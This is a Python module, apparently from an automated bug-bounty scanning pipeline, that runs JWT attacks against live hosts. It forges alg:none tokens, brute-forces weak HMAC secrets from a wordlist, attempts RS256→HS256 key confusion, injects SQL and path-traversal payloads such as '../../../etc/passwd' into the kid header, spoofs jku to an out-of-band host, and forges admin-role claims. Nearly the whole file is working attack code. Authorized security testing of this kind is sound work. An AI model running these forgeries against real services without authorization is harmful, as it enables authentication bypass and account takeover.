#!/usr/bin/env python3
# modules/step19_jwt.py — JWT Security Testing V7 (UPGRADED)
# New: RS256→HS256 confusion, kid injection, JWK header, jku header spoofing
# Source: Bug Bounty Bootcamp Ch18 — JWT attacks full methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, base64, json, hmac, hashlib, time, urllib.request, urllib.parse
from core.utils import safe_read
from core.http_client import sync_get

WEAK_SECRETS = [
    "secret","password","123456","test","admin","jwt","token","key",
    "secret123","mysecret","change_me","your-256-bit-secret",
    "your-secret-key","supersecret","hs256","jwtkey","","null",
    "jwt_secret","app_secret","private_key","12345","qwerty","letmein",
    "pass","master","root","toor","default","changeme","1234567890",
]

JWT_PATHS = [
    "/api/me","/api/user","/api/profile","/api/account",
    "/api/admin","/api/v1/me","/api/v2/me","/dashboard","/admin",
    "/api/whoami","/api/current_user","/api/auth/me","/api/identity",
]


class Step19Jwt:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["jwt_results"]
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("JWT: no live hosts"); return

        p.log.info("JWT V7: alg:none, weak secret, RS256→HS256, kid, jku, jwk")

        jwts_to_test = self._collect_tokens(live)
        if not jwts_to_test:
            p.log.info("JWT: No tokens found to test"); return

        p.log.info(f"JWT: testing {len(jwts_to_test)} tokens — 6 attack vectors")

        for jwt_token in jwts_to_test:
            results = self._full_audit(jwt_token, live[0] if live else "")
            for sev, vuln_type, detail in results:
                with open(out,"a") as f:
                    f.write(f"{vuln_type}: {detail}\n")
                p.add_finding(sev, vuln_type,
                              live[0] if live else p.target,
                              detail, "jwt-engine-v7")
                found += 1

        p.log.success(f"JWT V7: {found} issues found")

    # ── Token collection ─────────────────────────────────────────────────────
    def _collect_tokens(self, live: list) -> list:
        jwts = []
        for src in [
            getattr(self.p.args,"cookie",None) or "",
            getattr(self.p.args,"authorization",None) or "",
        ]:
            jwts.extend(self._extract_jwt(src))

        for host in live[:5]:
            for path in JWT_PATHS[:5]:
                resp = sync_get(host.rstrip("/")+path, timeout=6)
                if resp:
                    for src in [resp.get("body",""), str(resp.get("headers",""))]:
                        jwts.extend(self._extract_jwt(src))

        return list(set(jwts))[:10]

    def _extract_jwt(self, text: str) -> list:
        return re.findall(
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*',
            text
        )

    # ── Full audit — all 6 attack vectors ───────────────────────────────────
    def _full_audit(self, token: str, base_url: str) -> list:
        issues = []
        parts  = token.split(".")
        if len(parts) != 3:
            return issues

        header  = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])
        alg     = header.get("alg","")

        # ── Attack 1: alg:none (BB Bootcamp Ch18) ────────────────────────────
        if alg and alg.lower() != "none":
            for none_alg in ["none","None","NONE","nOnE"]:
                hdr  = base64.urlsafe_b64encode(
                    json.dumps({"alg":none_alg,"typ":"JWT"}).encode()
                ).rstrip(b"=").decode()
                test = f"{hdr}.{parts[1]}."
                if self._test_token(test, base_url):
                    issues.append(("critical","JWT_ALG_NONE",
                        f"alg:{none_alg} bypass accepted — JWT signature skipped entirely"))
                    break

        # ── Attack 2: Weak secret brute force (HS*) ──────────────────────────
        if alg in ("HS256","HS384","HS512"):
            hash_fn = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }[alg]
            msg = f"{parts[0]}.{parts[1]}".encode()
            for secret in WEAK_SECRETS:
                sig = hmac.new(secret.encode(), msg, hash_fn).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                if sig_b64 == parts[2]:
                    issues.append(("critical","JWT_WEAK_SECRET",
                        f"JWT secret cracked: '{secret}' — any token can be forged"))
                    break

        # ── Attack 3: RS256 → HS256 confusion (BB Bootcamp Ch18) ─────────────
        # Trick server into using public key as HMAC secret
        if alg == "RS256":
            pub_key = self._fetch_public_key(base_url)
            if pub_key:
                confused = self._forge_hs256_with_pubkey(parts, pub_key)
                if confused and self._test_token(confused, base_url):
                    issues.append(("critical","JWT_RS256_HS256_CONFUSION",
                        "RS256→HS256 algorithm confusion — forged using public key as secret"))

        # ── Attack 4: kid injection (SQL/Path traversal in kid header) ────────
        if "kid" in header:
            kid_payloads = [
                ("' UNION SELECT 'hacked'-- -", "JWT_KID_SQLI"),
                ("../../dev/null",               "JWT_KID_PATH_TRAVERSAL"),
                ("/dev/null",                    "JWT_KID_NULL_DEVICE"),
                ("../../../etc/passwd",           "JWT_KID_LFI"),
            ]
            for kid_val, vtype in kid_payloads:
                hdr_mod = dict(header)
                hdr_mod["kid"] = kid_val
                hdr_mod["alg"] = "HS256"
                hdr_b64 = base64.urlsafe_b64encode(
                    json.dumps(hdr_mod).encode()
                ).rstrip(b"=").decode()
                sig = hmac.new(b"", f"{hdr_b64}.{parts[1]}".encode(),
                               hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                test_token = f"{hdr_b64}.{parts[1]}.{sig_b64}"
                if self._test_token(test_token, base_url):
                    issues.append(("critical", vtype,
                        f"JWT kid header injection: '{kid_val}' — token accepted"))
                    break

        # ── Attack 5: jku/x5u header injection (BB Bootcamp Ch18) ────────────
        if self.p.oob:
            oob_url = f"https://{self.p.oob.get_payload('jwt_jku','jku')}/jwk.json"
            hdr_mod = dict(header)
            hdr_mod["jku"] = oob_url
            hdr_b64 = base64.urlsafe_b64encode(
                json.dumps(hdr_mod).encode()
            ).rstrip(b"=").decode()
            # Send with original sig — server fetches our JWK
            test_token = f"{hdr_b64}.{parts[1]}.{parts[2]}"
            self._test_token(test_token, base_url)
            issues.append(("medium","JWT_JKU_SSRF",
                f"jku header injection injected — check OOB for outbound JWK fetch to {oob_url}"))

        # ── Attack 6: Expired token still accepted ────────────────────────────
        exp = payload.get("exp", 0)
        if exp and exp < time.time():
            if self._test_token(token, base_url):
                issues.append(("high","JWT_EXPIRED_ACCEPTED",
                    f"Expired JWT (exp:{int(exp)}) still accepted"))

        # ── Attack 7: No expiry ──────────────────────────────────────────────
        if not exp:
            issues.append(("medium","JWT_NO_EXPIRY",
                "JWT has no 'exp' claim — tokens never expire"))

        # ── Attack 8: Sensitive data in payload ───────────────────────────────
        for key in ["password","secret","api_key","credit_card","ssn","private"]:
            if key in str(payload).lower():
                issues.append(("high","JWT_SENSITIVE_DATA",
                    f"Sensitive field '{key}' in JWT payload (unencrypted, base64 decodable)"))

        # ── Attack 9: Privilege escalation via claim tampering ────────────────
        priv_fields = {"role","admin","is_admin","isAdmin","group","scope","permissions"}
        for field in priv_fields:
            if field in payload:
                val = payload[field]
                # Try to forge elevated token (only works if alg:none also works)
                if "JWT_ALG_NONE" in [i[1] for i in issues]:
                    hdr_b64 = base64.urlsafe_b64encode(
                        json.dumps({"alg":"none","typ":"JWT"}).encode()
                    ).rstrip(b"=").decode()
                    elevated = dict(payload)
                    elevated[field] = "admin" if "admin" not in str(val) else True
                    pay_b64 = base64.urlsafe_b64encode(
                        json.dumps(elevated).encode()
                    ).rstrip(b"=").decode()
                    test_token = f"{hdr_b64}.{pay_b64}."
                    if self._test_token(test_token, base_url):
                        issues.append(("critical","JWT_PRIV_ESCALATION",
                            f"Privilege escalation: {field}={val} → admin via alg:none"))
                    break

        return issues

    # ── Helpers ──────────────────────────────────────────────────────────────
    def _decode_part(self, part: str) -> dict:
        try:
            padded = part + "=" * (4 - len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))
        except Exception:
            return {}

    def _test_token(self, token: str, base_url: str) -> bool:
        for path in JWT_PATHS[:4]:
            resp = sync_get(
                base_url.rstrip("/")+path,
                headers={"Authorization": f"Bearer {token}"},
                timeout=6
            )
            if resp and resp.get("status",0) in (200,201):
                return True
        return False

    def _fetch_public_key(self, base_url: str) -> bytes:
        """Try to get RSA public key from standard JWKS endpoints."""
        jwks_paths = ["/.well-known/jwks.json","/api/auth/jwks",
                      "/auth/.well-known/jwks.json","/oauth/jwks"]
        for path in jwks_paths:
            try:
                resp = sync_get(base_url.rstrip("/")+path, timeout=6)
                if resp and resp.get("status") == 200:
                    data = json.loads(resp.get("body","{}"))
                    keys = data.get("keys",[])
                    if keys and "n" in keys[0]:
                        # Return raw JWK as bytes (simplified — real impl needs cryptography lib)
                        return json.dumps(keys[0]).encode()
            except Exception:
                pass
        return None

    def _forge_hs256_with_pubkey(self, parts: list, pub_key: bytes) -> str:
        """Forge HS256 token using RSA public key as HMAC secret (algorithm confusion)."""
        try:
            hdr = base64.urlsafe_b64encode(
                json.dumps({"alg":"HS256","typ":"JWT"}).encode()
            ).rstrip(b"=").decode()
            msg = f"{hdr}.{parts[1]}".encode()
            sig = hmac.new(pub_key, msg, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{hdr}.{parts[1]}.{sig_b64}"
        except Exception:
            return None
